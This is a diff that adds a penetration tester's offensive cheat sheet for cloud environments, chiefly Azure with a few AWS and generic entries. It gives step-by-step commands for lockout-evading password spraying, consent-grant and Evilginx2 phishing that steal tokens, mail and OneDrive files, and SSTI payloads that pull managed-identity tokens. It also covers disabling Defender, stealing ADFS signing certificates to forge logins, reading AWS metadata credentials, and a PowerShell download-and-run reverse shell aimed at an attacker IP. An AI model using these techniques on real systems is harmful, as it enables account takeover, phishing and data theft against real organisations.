@@ -1,0 +1,379 @@
+===Azure===
+
+Password Spraying
+     MSOL Spray
+          https://github.com/dafthack/MSOLSpray
+
+     Import-Module MSOLSpray.ps1
+     Invoke-MSOLSpray -UserList /path/to/userlist -Password <pass_to_spray>
+
+     Azure Password Protection – Prevents users from picking passwords with certain words like seasons, company name, etc.
+                         
+     Azure Smart Lockout – Locks out auth attempts whenever brute force or spray attempts are detected.
+                         
+     Can be bypassed with FireProx + MSOLSpray
+          https://github.com/ustayready/fireprox
+
+FireProx
+     Password Spraying Azure/O365 while randomizing IPs with FireProx Install
+
+     git clone https://github.com/ustayready/fireprox
+     cd fireprox
+     virtualenv -p python3 .
+     source bin/activate
+     pip install -r requirements.txt
+     python fire.py
+
+     Launch FireProx
+          python fire.py --access_key <access_key_id> --secret_access_key <secret_access_key> --region <region> --url https://login.microsoft.com --command create
+
+     Password spray using FireProx + MSOLSpray
+          Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020 -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox
+
+
+Illicit Consent Grant
+     Victim users must be able to consent to apps (see AzureAD Recon)
+
+     see https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/azure-web-app-service-for-offensive-operations/
+   
+     Set up a new Azure Application via Azure App Services
+
+          Navigate to "App Services” in the Azure portal
+          Click the “Create” button on the next page
+          On the “Web App” screen set your subscription
+          Create a new resource group and call it “Phishing”
+          Set the “Name” to something unique
+               this is what the target will end up being directed to 
+               choose wisely
+          Set the runtime stack to PHP 7.3
+          Set OS to Linux
+          Pick a Region
+          Click “Change size” under the Sku and size section
+          Click “Dev/Test”
+          Click the F1 “free” tier of pricing
+          Click Apply
+          Click Review + create
+          Click Create
+          Once deployment is complete click “Go to resource”
+
+          Click on “SSH” option to the left under “Development Tools”
+          Click Go
+     
+     Install a basic PHP redirector that collects HTTP header info
+          (See also: https://github.com/mdsecactivebreach/o365-attack-toolkit)
+
+          apt-get install git
+          git clone https://github.com/dafthack/BasicPHPRedirector.git 
+          cp BasicPHPRedirector/* site/wwwroot/
+          cd site/wwwroot/
+          rm –rf hostingstart.html
+
+     Open a browser to your Azure App Service app and verify the redirection occurs
+          browser should land on the Microsoft Login page
+          should also populate the “ip.txt” file on disk
+               header information from the web request
+
+     Register an application
+          Azure Active Directory > App Registrations
+          Click on New registration
+          Name the application - this will be seen by victim
+          Select 'Accounts in any organizational directory (Any Azure AD directory - Multitenant)'
+          Select "Web"
+          Provide URL/IP of attacker VM in the Redirect URI (from Azure app above, 365-stealer, etc)
+          In the OverView, note the Application (Client) ID
+     Create client secret
+          'Certificates & Secrets'
+          Create a new client secret and copy it
+     Set application API permissions
+          'API permissions'
+               add any or all of 
+                    user.read
+                    User.ReadBasic.All
+                    mail.read
+                    mail.send
+                    mailboxsettings.readwrite
+                    notes.read.all
+                    files.readwrite.all
+
+
+365-Stealer Phishing 
+     https://github.com/AlteredSecurity/365-Stealer
+
+     :warning: Default port for 365-Stealer phishing is 443
+
+     Install Python3 (see https://www.digitalocean.com/community/tutorials/install-python-windows-10)
+          https://www.python.org/downloads/windows/
+          select pip in Optional Features
+     Install XAMPP
+          https://www.apachefriends.org/download.html
+     Run XAMPP and start Apache
+     Clone 365-Stealer into `C:\xampp\htdocs\`  (see https://github.com/AlteredSecurity/365-Stealer)
+          git clone https://github.com/AlteredSecurity/365-Stealer.git
+     Install the requirements
+          pip install -r requirements.txt
+
+     Enable sqlite3 (Xampp > Apache config > php.ini > Search for extension=sqlite3 and remove ";")
+          Restart Apache
+     
+     Edit `C:/xampp/htdocs/yourvictims/index.php` if needed
+     
+     Disable IP whitelisting `$enableIpWhiteList = false;`
+     
+     Go to 365-Stealer Management portal > Configuration (http://localhost:82/365-stealer/yourVictims)
+          Client Id: Application(Client) Id of app we registered.
+          Client Secret: Secret value from the Certificates & secrets tab
+          Redirect URL: URL that we entered during registering the app like `https://<Domain/IP>:<port>/login/authorized` for 365-stealer
+          
+          Macros Location (optional): Path of macro file to inject.
+          Extension in OneDrive (optional): file extensions to download from the victims account or provide `*` to download all the files present in the victims OneDrive (file extensions should be comma separated)
+          Delay (optional): Delay request - specify time in seconds
+
+     Create a Self Signed Certificate to use HTTPS
+     
+     Click to Run the application 
+
+          Or run this command : `python 365-Stealer.py --run-app`
+          Options
+               `--no-ssl`: disable HTTPS
+               `--port`: change the default listening port
+               `--token`: provide a specific token
+               `--refresh-token XXX --client-id YYY --client-secret ZZZ`: use a refresh token
+
+     Find the Phishing URL: go to `https://<IP/Domain>:<Port>` and click on **Read More** button or in the console.
+
+     **Mitigation**: Enable `Do not allow user consent` for applications in the "Consent and permissions menu".
+
+
+Requesting Azure Managed Identity tokens
+     from application environment variables or similar, get
+          IDENTITY_HEADER
+          IDENTITY_ENDPOINT
+     use to request token for managed identity (see below)
+     note the token value and client_id value for use with Az CLI
+
+     curl
+          curl "<IDENTITY_ENDPOINT>?resource=https://management.azure.com&api-version=2017-09-01" -H secret: <IDENTITY_HEADER>
+
+          curl "<IDENTITY_ENDPOINT>?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret: <IDENTITY_HEADER>
+
+          curl "<IDENTITY_ENDPOINT>?resource=https://vault.azure.net&api-version=2017-09-01" -H secret: <IDENTITY_HEADER>
+
+     Python
+          $resource = "https://graph.microsoft.com"
+          $endpoint = $env:IDENTITY_ENDPOINT
+          $header = $env:IDENTITY_HEADER
+          $apiVersion = "2019-08-01"
+
+          $headers = @{ 'X-Identity-Header' = $header }
+          $url = "$($endpoint)?api-version=$apiVersion&resource=$resource"
+
+          $response = Invoke-RestMethod -Method Get -Uri $url -Headers $headers
+          $response.access_token
+
+     SSTI
+          {{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api- version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
+
+     Azure & Graph API via Python
+     
+          IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
+          IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
+
+          print("[+] Management API")
+          cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+          val = os.popen(cmd).read()
+          print("Access Token: "+json.loads(val)["access_token"])
+          print("ClientID/AccountID: "+json.loads(val)["client_id"])
+
+          print("\r\n[+] Graph API")
+          cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+          val = os.popen(cmd).read()
+          print(json.loads(val)["access_token"])
+          print("ClientID/AccountID: "+json.loads(val)["client_id"])
+
+     Inside a Python Function:
+
+          import logging, os
+          import azure.functions as func
+
+          def main(req: func.HttpRequest) -> func.HttpResponse:
+               logging.info('Python HTTP trigger function processed a request.')
+               IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
+               IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
+               cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+               val = os.popen(cmd).read()
+               return func.HttpResponse(val, status_code=200)
+     
+
+Requesting Azure Keyvault token
+     from application environment variables or similar, get
+          IDENTITY_HEADER
+          IDENTITY_ENDPOINT
+     use to request token for managed identity (see below)
+     note the token value and client_id value for use with Az CLI
+
+     SSTI 
+          {{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
+
+Requesting MS Graph token
+     (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
+
+
+Evilginx2 Phishing 
+
+     evilginx2 -p C:\path\to\evilginx2\phishlets
+
+     config domain <attacker_domain>    #arbitrary domain
+     config ip <attacker_ip>
+     phishlets hostname o365 login.<attacker_domain>
+     phishlets get-hosts o365
+
+     Copy-Item C:\Users\<attacker_user>\.evilginx\crt\ca.crt C:\Users\<attacker_user>\.evilginx\crt\login.<attacker_domain>\o365.crt
+
+     Copy-Item C:\Users\<attacker_user>\.evilginx\crt\private.key C:\Users\<attacker_user>\.evilginx\crt\login.<attacker_domain>\o365.key
+
+     On (Technitium) DNS server
+          Zones tab
+          Add Zone
+               Zone - <attacker_domain>
+               Type - Select Primary Zone(default) value
+          Add 
+          Edit the NS record
+               'Name Server' value: <DNS_server_IP>
+          Edit the SOA record
+               Primary Name Server value: <DNS_server_IP>
+          Add an A record
+               Name - login.login
+               Type – A
+               TTL – 180
+               IPv4 Address - <attacker_IP>
+          Add an A record
+               Name - www.login
+               Type – A
+               TTL – 180
+               IPv4 Address - <attacker_IP>
+     
+     phishlets enable o365
+     lures create o365             #note lure ID
+     lures get-url <lure_id>       #note lure URL
+
+     Use URL in phishing email and wait for response in Evilginx console
+
+Automation Runbooks
+     Import-AzAutomationRunbook -Name <runbook_name> -Path /path/to/runbook.ps1 -AutomationAccountName <automation_account_name> -ResourceGroupName <resource_group_name> -Type PowerShell -Force -Verbose
+
+     Publish-AzAutomationRunbook -RunbookName <runbook_name> -AutomationAccountName <automation_account_name> -ResourceGroupName <resource_group_name> -Verbose
+
+     Start a netcat listener on the port specified in the runbook
+          nc -lvp 4444 
+
+     Start-AzAutomationRunbook -RunbookName <runbook_name> -RunOn <runbook_worker_name> -AutomationAccountName <automation_account_name> -ResourceGroupName <resource_group_name> -Verbose 
+
+Conditional Access Bypasses 
+     Log in from command line with username and password in command
+          az login -u <username>@<domain>.onmicrosoft.com -p <password>
+
+          $credential = Get-Credential
+          Connect-AzAccount -Credential $credential
+
+          $credential = Get-Credential
+          Connect-MsolService -Credential $credential
+
+     Log in from mobile device 
+          Device platform is decided by looking at the User-Agent string of the client used to authenticate. 
+               Chrome - F12 & click on toggle device toolbar
+                    change to a mobile device
+
+
+Deployment templates
+     check for clear-text credentials
+
+
+GitHub CI/CD pipeline 
+     changes made to the repo may be used for CI/CD for an app
+
+     Get an Azure access token for the app's managed identity
+          import logging, os
+          import azure.functions as func
+          def main(req: func.HttpRequest) -> func.HttpResponse: 
+               logging.info('Python HTTP trigger function processed a request.') IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT'] IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
+               cmd = 'curl "%s?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+               val = os.popen(cmd).read()
+               return func.HttpResponse(val, status_code=200)
+
+
+Extract token-signing certificate from ADFS 
+     need IP of the AD FS server and user with DA privileges
+
+     Load AADInternals module in PSRemoting session
+          https://github.com/Gerenios/AADInternals
+
+          In remote session
+               Set-MpPreference -DisableRealtimeMonitoring $true
+               exit
+          On attacker host
+               Copy-Item -ToSession $session_settings_for_adfs_server -Path C:\attacker\path\to\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents
+
+               Enter-PSSession $session_settings_for_adfs_server
+          In remote session
+               Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
+
+               Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
+
+          Export the token signing certificate
+               Export-AADIntADFSSigningCertificate
+
+          Get ImmutableID of victim user 
+               Uses ADModule
+                    https://github.com/samratashok/ADModule
+
+               Import-Module C:\attacker\path\to\ADModule\Microsoft.ActiveDirectory.Management.dll
+               
+               Import-Module C:\attacker\path\to\ADModule\ActiveDirectory\ActiveDirectory.psd1
+
+               [System.Convert]::ToBase64String((Get-ADUser -Identity <victim_username> -Server <server_ip> -Credential $creds_used_to_access_adfs_session | select -ExpandProperty ObjectGUID).tobytearray())
+
+          Use token signing cert with ImmutableID
+               Open-AADIntOffice365Portal - ImmutableID <victim_immutable_id> -Issuer http://<victim_domain>/adfs/services/trust -PfxFileName C:\users\<adfs_admin_username>\Documents\ADFSSigningCertificate.pfx -Verbose
+
+          Copy the temp HTML to the attacker machine
+               On the victim ADFS server
+                    ls C:\Users\adfsadmin\AppData\Local\Temp\*.tmp.html
+                    exit
+               On the attacker machine
+                    Copy-Item -FromSession $session_settings_for_adfs_server -Path C:\Users\<adfs_admin_username>\AppData\Local\Temp\tmp<temp_ID>.tmp.html -Destination C:\path\on\attacker\machine
+                    
+          Open the html file with Chrome to access the tenant
+               Sign in with victim creds
+
+
+
+===AWS===
+
+AWS Metadata
+     IAM role in use
+          http://169.254.169.254/latest/meta-data/iam/security-credentials
+          
+          NOTE: http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance is internal only
+               see https://rhynorater.github.io/AWS-Metadata-Identity-Credentials
+
+     Creds for IAM role in use
+          http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
+
+
+
+
+
+
+===GCP===
+
+
+===OTHER===
+
+Powershell reverse shell
+     iex (New-Object Net.Webclient).downloadstring("http://<attacker_IP:port>/Invoke-PowerShellTcp.ps1") Power -Reverse -IPAddress <attacker_IP> -Port <attacker_listener_port>
+
+
+
+
+
+
